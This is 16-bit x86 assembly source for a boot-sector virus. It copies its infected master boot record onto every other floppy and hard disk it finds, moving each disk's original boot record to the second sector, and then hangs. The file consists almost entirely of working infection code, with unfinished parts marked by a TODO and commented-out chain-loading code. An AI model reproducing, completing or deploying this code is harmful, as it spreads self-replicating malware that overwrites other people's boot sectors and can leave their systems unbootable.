[bits 16]
org 0x7c00

start:
  cli                         ; no interrupt zone
  mov BYTE [bootDrive], dl    ; save boot drive, this is infected drive
  mov sp, 0xFFF8              ; stack pointer

                            ; let's save infected mbr to location 0x7e00
  mov al, 0x01              ; load 1 sector
  mov ah, 0x02              ; read sector
  mov bx, 0x7e00            ; destination address + ES
  mov cx, 0x0001            ; cylinder 0, sector=1
  xor dh, dh                ; head 0
  call wr_sector
  ; TODO: read from 0x7c00!!!!
  ; now it's time to iterate through disks
  xor di, di                ; our disk counter
dsk_lp:
  mov dl, [disk_codes+di]   ; load disk code from our table
  cmp dl, [bootDrive]       ; check if this is our infected drive
  je nxt_disk               ; this is our drive, just go to the next one

  mov ah, 0x02              ; read sector
  mov cx, 0x0001            ; cylinder 0, sector=1
  mov bx, 0x8000            ; load original mbr to 0x8000
  call wr_sector
  jc nxt_disk               ; if carry is set, disk doesn't exist (most likely)

  mov ah, 0x03              ; dirty business, copy our infected mbr to new drive
  mov bx, 0x7e00            ; we copied infected mbr to 0x7e00 earlier
  call wr_sector            ; perform write

  mov ah, 0x03
  mov cx, 0x0002            ; write original mbr to 2nd sector
  mov bx, 0x8000            ; we saved sector to 0x8000
  call wr_sector            ; perform write
nxt_disk:
  inc di                    ; increment our counter
  cmp di, 0x04              ; we are over the available disks
  jl dsk_lp                ; jump if lower than 4

lp1:
  jmp lp1




  ;mov dl, 0x81
  ;call write_sector
  ;.CopyLower:
    ;mov cx, 0x0100            ; 256 WORDs in MBR
    ;mov si, 0x7C00            ; Current MBR Address
    ;mov di, 0x0600            ; New MBR Address
    ;rep movsw                 ; Copy MBR
  ;jmp 0:LowStart              ; Jump to new Address

  ;.jumpToVBR:
    ;cmp WORD [0x7DFE], 0xAA55 ; Check Boot Signature
    ;jne ERROR                 ; Error if not Boot Signature
    ;mov si, WORD [PToff]      ; Set DS:SI to Partition Table Entry
    ;mov dl, BYTE [bootDrive]  ; Set DL to Drive Number
    ;jmp 0x7C00                ; Jump To VBR

; write/read sector on disk, based on
; ah = 0x02 read, ah = 0x03 write
; dl = disk number
wr_sector:
  mov si, 0x03                ; max number of attempts to read from drive
.lprs:
  int 0x13
  jnc .endrs                  ; alright carry was not set, read was successful
  dec si                      ; decrement counter
  jc .endrs
  pusha
  xor ah, ah                  ; ah = 0, reset disk
  int 0x13                    ; reset disk, we have to try this at most 3 times
  popa
  jmp .lprs
.endrs:
  retn


times (218 - ($-$$)) nop      ; Pad for disk time stamp

DiskTimeStamp times 8 db 0    ; Disk Time Stamp


bootDrive db 0                ; Our Drive Number Variable
disk_codes:                   ; available drives variable
  db 0x0                      ; first floppy disk
  db 0x1                      ; second floppy disk
  db 0x80                     ; first hard disk
  db 0x81                     ; second hard disk

times (0x1b4 - ($-$$)) nop    ; Pad For MBR Partition Table

UID times 10 db 0             ; Unique Disk ID
PT1 times 16 db 0             ; First Partition Entry
PT2 times 16 db 0             ; Second Partition Entry
PT3 times 16 db 0             ; Third Partition Entry
PT4 times 16 db 0             ; Fourth Partition Entry

dw 0xAA55                     ; Boot Signature
